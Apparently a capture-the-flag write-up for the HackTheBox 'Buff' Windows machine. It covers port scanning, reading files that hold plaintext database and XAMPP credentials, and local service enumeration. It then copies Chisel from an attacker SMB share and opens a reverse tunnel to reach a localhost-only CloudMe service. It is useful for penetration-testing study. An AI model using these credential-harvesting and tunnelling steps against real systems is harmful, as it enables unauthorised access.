# Buff - Windows

Difficulty: 2

## Enumeration

scanning ports

```bash
------------------------------------------------------------                                  
        Threader 3000 - Multi-threaded Port Scanner                                           
                       Version 1.0.7                                                          
                   A project by The Mayor                                                     
------------------------------------------------------------                                  
Enter your target IP address or URL here: 10.10.10.198                                        
------------------------------------------------------------                                  
Scanning target 10.10.10.198                                                                  
Time started: 2021-09-13 22:21:23.289215                                                      
------------------------------------------------------------                                  
Port 7680 is open                                                                             
Port 8080 is open                                                                             
Port scan completed in 0:01:39.242008                                                         
------------------------------------------------------------                                  
Threader3000 recommends the following Nmap scan:                                              
************************************************************                                  
nmap -p7680,8080 -sV -sC -T4 -Pn -oA 10.10.10.198 10.10.10.198                                
************************************************************                                  
Would you like to run Nmap or quit to terminal?                                               
------------------------------------------------------------                                  
1 = Run suggested Nmap scan                                                                   
2 = Run another Threader3000 scan                                                             
3 = Exit to terminal                                                                          
------------------------------------------------------------                                  
Option Selection: 1                                                                           
nmap -p7680,8080 -sV -sC -T4 -Pn -oA 10.10.10.198 10.10.10.198                                
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-13 22:23 IST                               
Nmap scan report for buff.htb (10.10.10.198)                                                  
Host is up (0.25s latency).                                                                   
                                                                                              
PORT     STATE SERVICE    VERSION                                                             
7680/tcp open  pando-pub?                                                                     
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)              
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6                          
|_http-title: mrb3n's Bro Hut                                                                 
| http-open-proxy: Potentially OPEN proxy.                                                    
|_Methods supported:CONNECTION                                                                
                                                                                              
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.91 seconds                                  
------------------------------------------------------------                                  
Combined scan completed in 0:03:15.272223                                                     
Press enter to quit...
```

## Initial access

![Untitled](Buff%20-%20Windows%205d684a4f6eb24f1b8e7c6de9fdaf19a2/Untitled.png)

![Untitled](Buff%20-%20Windows%205d684a4f6eb24f1b8e7c6de9fdaf19a2/Untitled%201.png)

```bash
C:\xampp\htdocs\gym>type "New Text Document.txt"
type "New Text Document.txt"
$mysql_host = "mysql16.000webhost.com";
$mysql_database = "a8743500_secure";
$mysql_user = "a8743500_secure";
$mysql_password = "ipad12345";
```

```bash
C:\xampp>type passwords.txt
type passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).
```

## Copying files using smbserver

![Untitled](Buff%20-%20Windows%205d684a4f6eb24f1b8e7c6de9fdaf19a2/Untitled%202.png)

![Untitled](Buff%20-%20Windows%205d684a4f6eb24f1b8e7c6de9fdaf19a2/Untitled%203.png)

## Privilege Escalation

```bash
C:\xampp>type passwords.txt
type passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).
```

### Enumeration

### Netstat

Checking the `netstat`
 shows two ports listening only on localhost. 3306 is MySQL, which makes
 sense for the PHP site and XAmpp stack. The other is 8888:

```C:\>netstat -ano | findstr TCP | findstr ":0"
netstat -ano | findstr TCP | findstr ":0"
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       952
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5952
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       5772
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       4140
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       512
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1032
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1532
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2196
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       660
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       684
  TCP    10.10.10.198:139       0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       7088
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       2820
  TCP    [::]:135               [::]:0                 LISTENING       952
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:7680              [::]:0                 LISTENING       5772
  TCP    [::]:8080              [::]:0                 LISTENING       4140
  TCP    [::]:49664             [::]:0                 LISTENING       512
  TCP    [::]:49665             [::]:0                 LISTENING       1032
  TCP    [::]:49666             [::]:0                 LISTENING       1532
  TCP    [::]:49667             [::]:0                 LISTENING       2196
  TCP    [::]:49668             [::]:0                 LISTENING       660
  TCP    [::]:49669             [::]:0                 LISTENING       684
```

I’ll grab the process ID (2820) and grep (or `findstr`) for i in the `tasklist` (the listening process id changes every minute so I’ll have to search quickly):

```C:\>tasklist /v | findstr 2820
tasklist /v | findstr 2820
CloudMe.exe                   2820                            0     37,444 K Unknown         N/A                                                     0:00:00 N/A`
```
If I dig a bit more in shaun’s home directory, there’s an exe in the Downloads folder:

`C:\Users\shaun\Downloads>dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Users\shaun\Downloads

19/07/2020  20:08    <DIR>          .
19/07/2020  20:08    <DIR>          ..
16/06/2020  16:26        17,830,824 CloudMe_1112.exe
               1 File(s)     17,830,824 bytes
               2 Dir(s)   9,775,751,168 bytes free`

### Tunnel

To exploit this service, I’ll need a tunnel from my box to Buff (or 
I’d have to run the exploit from Buff, but Python isn’t typically 
installed on Windows). I’ll use my favorite tool for this, [Chisel](https://github.com/jpillora/chisel). I’ll use the same SMB share and copy the Windows binary to where I’m staging in `\programdata`.

C:\ProgramData>copy \\10.10.14.20\share\chisel_1.6.0_windows_amd64 c.exe
copy \\10.10.14.20\share\chisel_1.6.0_windows_amd64 c.exe       
        1 file(s) copied.

Now I’ll run the Linux binary on Kali in server mode:

`root@kali:/opt/chisel# ./chisel_1.6.0_linux_amd64 server -p 8000 --reverse
2020/07/19 07:03:48 server: Reverse tunnelling enabled
2020/07/19 07:03:48 server: Fingerprint 34:e6:05:6e:5d:8a:f6:a3:72:78:31:31:f5:f3:01:b1
2020/07/19 07:03:48 server: Listening on 0.0.0.0:8000...`

Next, from Buff, I’ll run as a client:

`C:\ProgramData>.\c.exe client 10.10.14.20:8000 R:8888:localhost:8888
.\c.exe client 10.10.14.20:8000 R:8888:localhost:8888           
2020/07/19 20:07:45 client: Connecting to ws://10.10.14.20:8000 
2020/07/19 20:07:45 client: Fingerprint 34:e6:05:6e:5d:8a:f6:a3:72:78:31:31:f5:f3:01:b1
2020/07/19 20:07:45 client: Connected (Latency 1.0595ms)`

I can see the connection at the server as well:

`2020/07/19 15:06:13 server: proxy#1:R:0.0.0.0:8888=>localhost:8888: Listening`

I can see my local box is listening on 8888:

`root@kali# netstat -ntlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      17843/python        
tcp        0      0 127.0.0.1:38153         0.0.0.0:*               LISTEN      17843/python        
tcp        0      0 127.0.0.1:54261         0.0.0.0:*               LISTEN      17843/python        
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      13166/./chisel_1.6. 
tcp6       0      0 :::8000                 :::*                    LISTEN      13166/./chisel_1.6. 
tcp6       0      0 127.0.0.1:41643         :::*                    LISTEN      2654/java           
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      2654/java`